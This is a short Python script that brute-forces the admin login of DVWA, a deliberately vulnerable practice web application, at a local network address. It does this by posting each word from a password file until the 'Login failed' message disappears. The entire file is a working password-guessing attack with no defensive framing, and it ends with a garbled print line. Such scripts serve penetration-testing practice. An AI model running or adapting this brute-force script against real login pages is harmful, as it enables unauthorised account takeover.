import requests


target_url = "http://192.168.0.104/dvwa/login.php"
data_dict = {'username':'admin','password':'', 'Login':'submit'}

with open("passwords.txt","r") as password_file:
    for password in password_file:
        word = password.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data = data_dict)
        resp = response.content.decode('UTF-8')
        if "Login failed" not in resp:
            print("mila password")
            exit()
print("vfmkfoekb o")
